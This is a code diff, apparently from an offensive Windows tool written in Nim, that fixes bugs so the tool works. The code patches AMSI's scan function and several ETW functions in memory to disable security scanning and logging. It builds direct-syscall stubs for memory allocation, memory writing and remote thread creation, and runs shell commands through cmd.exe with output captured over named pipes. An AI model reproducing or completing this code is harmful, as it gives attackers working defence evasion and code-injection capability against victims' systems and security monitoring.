@@ -66,6 +66,12 @@ type customNtCreateProcess = proc(
 ): NTSTATUS {.stdcall.}
 
 
+var myNtAllocateVirtualMemory*: customNtAllocateVirtualMemory
+var myNtWriteVirtualMemory*: customNtWriteVirtualMemory
+var myNtCreateThreadEx*: customNtCreateThreadEx
+var myNtCreateNamedPipeFile*: customNtCreateNamedPipeFile
+var myNtCreateProcess*: customNtCreateProcess
+
 #functions
 proc PatchAMSI*() =
     let size = 6
@@ -82,7 +88,7 @@ proc PatchAMSI*() =
         return
 
     if VirtualProtect(amsiscanbuffer,size,PAGE_EXECUTE_WRITECOPY, addr oldProtect) != 0:
-        copyMem(amsiscanbuffer,addr path,size)
+        copyMem(amsiscanbuffer,addr patch,size)
         discard VirtualProtect(amsiscanbuffer,size,oldProtect, addr oldProtect)
     echo "AMSI funtion activated and done!"
     
@@ -95,8 +101,8 @@ proc PathETW*() =
       "EtwEventWriteTransfer",
       "EtwEventActivityIdControl"
     ]
-    let patch : array(1,byte) = [0xC3]
-    let oldProtect : DWORD
+    let patch : array[1,byte] = [0xC3]
+    var oldProtect : DWORD
     let size = 1
     let ntdll = GetModuleHandleA("ntdll.dll")
     if cast[uint](ntdll) == 0:
@@ -107,7 +113,7 @@ proc PathETW*() =
         if cast[uint](function) == 0:
             continue
         if VirtualProtect(function,size,PAGE_EXECUTE_WRITECOPY,addr oldProtect) != 0:
-            copyMem(function, addr path, size)
+            copyMem(function, addr patch, size)
             discard VirtualProtect(function,size,oldProtect,addr oldProtect)
     
     echo "AMSI funtion activated and done!"
@@ -181,12 +187,12 @@ proc makeNtAllocateVirtualMemory*() =
     var oldProtect: DWORD
     var stub : LPVOID = VirtualAlloc(NULL,cast[SIZE_T](23),(MEM_RESERVE or MEM_COMMIT),PAGE_READWRITE)
     discard GetSyscallStub("NtAllocateVirtualMemory",stub)
-    if stub == nil:
+    if (stub == nil):
         echo "NtAllocateVirtualMemory not found"
         return
     else:
         VirtualProtect(stub,cast[SIZE_T](23),PAGE_EXECUTE_READ,addr oldProtect)
-        let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](stub)
+        myNtAllocateVirtualMemory = cast[customNtAllocateVirtualMemory](stub)
 
 proc makeNtWriteVirtualMemory*() =
     var oldProtect: DWORD
@@ -282,11 +288,11 @@ proc NamePipeCreator(): tuple[serverHandle: HANDLE, clientHandle: HANDLE] =
     return (server_pipe_handle, client_pipe_handle)
 
 
-proc ReadPipe(pipe_handle: HANDLE): =
+proc ReadPipe(pipe_handle: HANDLE): string=
     var buffer: array[4096, char]
     var bytesRead: DWORD
     var totalBytes: int = 0
-    
+    var output: string
     echo "[*] Starting to read from pipe..."
     
     while true:
@@ -300,7 +306,7 @@ proc ReadPipe(pipe_handle: HANDLE): =
                 break
             else:
                 echo "[-] ReadFile error: ", err
-                return false
+                return
         
         if bytesRead == 0:
             # No more data available, but pipe still open
@@ -309,7 +315,7 @@ proc ReadPipe(pipe_handle: HANDLE): =
         
         # Print the data
         totalBytes += bytesRead.int
-        var output = newString(bytesRead)
+        output = newString(bytesRead)
         copyMem(addr output[0], addr buffer[0], bytesRead)
         stdout.write(output)
         stdout.flushFile()
@@ -328,7 +334,7 @@ proc execProcess*(cmd: string): string =
     var size: SIZE_T
     var si: STARTUPINFOEX
     var pi: PROCESS_INFORMATION
-    command = "cmd.exe /c "&cmd
+    let command = "cmd.exe /c "&cmd
     echo "[*] === Starting Command Execution ==="
     echo "[*] Command: ", command
     echo ""
